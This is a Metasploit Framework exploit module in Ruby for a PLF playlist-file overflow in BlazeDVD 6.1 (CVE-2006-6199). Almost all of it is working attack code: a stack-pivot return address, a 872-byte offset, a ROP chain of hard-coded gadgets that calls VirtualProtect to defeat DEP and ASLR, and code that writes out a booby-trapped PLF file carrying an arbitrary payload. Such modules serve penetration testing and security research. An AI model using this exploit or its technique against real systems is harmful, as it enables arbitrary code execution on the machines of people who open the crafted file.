# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;      => &#039;BlazeDVD 6.1 PLF Exploit DEP/ASLR Bypass&#039;,
            &#039;Description&#039;   => %q{
                    This module updates an existing MSF module originally written for BlazeDVD 5.1. The new module
                    will bypass DEP and ASLR on version 6. The original vulnerability is due to the handling of
                    specially crafted PLF files. Exploiting this allows us to execute arbitrary code running under
                    the context of the user.
            },
            &#039;License&#039;       => MSF_LICENSE,
            &#039;Author&#039;        =>
                [
                    &#039;Gjoko Krstic&#039;, # Original discovery
                    &#039;Craig Freyman @cd1zz&#039;, # MSF Module
                ],
            &#039;References&#039;    =>
                [
                    [ &#039;OSVDB&#039;, &#039;30770&#039; ],
                    [ &#039;CVE&#039;, &#039;2006-6199&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/6217/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/13905/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/9329/&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/16618/&#039; ]
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;ExitFunction&#039; => &#039;process&#039;,
                    #&#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
                },
            &#039;Platform&#039;  => &#039;win&#039;,
            &#039;Payload&#039;   =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x1a\x2f\x3a\x5c",
                    &#039;DisableNops&#039; => true,
                    &#039;StackAdjustment&#039; => -3500
                },
 
            &#039;Targets&#039;       =>
                [
                    [ &#039;win&#039;,
                        {
                            &#039;Ret&#039;       =>   0x6030ef6c,# : {pivot 2352 / 0x930} :  # POP ESI # ADD ESP,92C # RETN
                            &#039;Offset&#039;    =>   872
                        }
                    ],
                ],
            &#039;Privileged&#039;    => false,
            &#039;DisclosureDate&#039;    => &#039;Aug 10 2008&#039;,
            &#039;DefaultTarget&#039; => 0))
 
        register_options([OptString.new(&#039;FILENAME&#039;, [ false, &#039;The file name.&#039;, &#039;msf.plf&#039;]),], self.class)
 
    end
 
    def create_rop_chain()
 
        # rop chain generated with mona.py - www.corelan.be
        rop_gadgets =
        [
            0x640258bf, # POP EAX # RETN [MediaPlayerCtrl.dll]
            0x10011108, # ptr to &VirtualProtect() [IAT SkinScrollBar.Dll]
            0x6033d8be, # MOV ESI,DWORD PTR DS:[EAX] # RETN [Configuration.dll]
            0x60327f7f, # POP EBP # RETN [Configuration.dll]
            0x616069a1, # & push esp #  ret 04 [EPG.dll]
            0x60335f98, # POP EAX # RETN [Configuration.dll]
            0xfffffdff, # Value to negate, will become 0x00000201
            0x6404c4c3, # NEG EAX # RETN [MediaPlayerCtrl.dll]
            0x64016676, # XCHG EAX,EBX # RETN [MediaPlayerCtrl.dll]
            0x6410948f, # POP EAX # RETN [NetReg.dll]
            0xffffffc0, # Value to negate, will become 0x00000040
            0x6033b0eb, # NEG EAX # RETN [Configuration.dll]
            0x61608ba2, # XCHG EAX,EDX # RETN [EPG.dll]
            0x6033d975, # POP ECX # RETN [Configuration.dll]
            0x6411c001, # &Writable location [NetReg.dll]
            0x6410a85d, # POP EDI # RETN [NetReg.dll]
            0x6160b805, # RETN (ROP NOP) [EPG.dll]
            0x6402c108, # POP EAX # RETN [MediaPlayerCtrl.dll]
            0x90909090, # nop
            0x6033d886, # PUSHAD # RETN [Configuration.dll]
        ].flatten.pack("V*")
 
        return rop_gadgets
 
    end
 
    def exploit
        rop_chain = create_rop_chain()
        stack_adjust = "\x81\xc4\x24\xfa\xff\xff"
        buf = &#039;&#039;
        buf << make_nops(target[&#039;Offset&#039;])
        buf << [target.ret].pack(&#039;V&#039;)
        buf << make_nops(8) #filler for stack pivot
        buf << rop_chain
        buf << stack_adjust
        buf << payload.encoded
        buf << make_nops(5000 - buf.length)
 
        file_create(buf)
 
    end
end

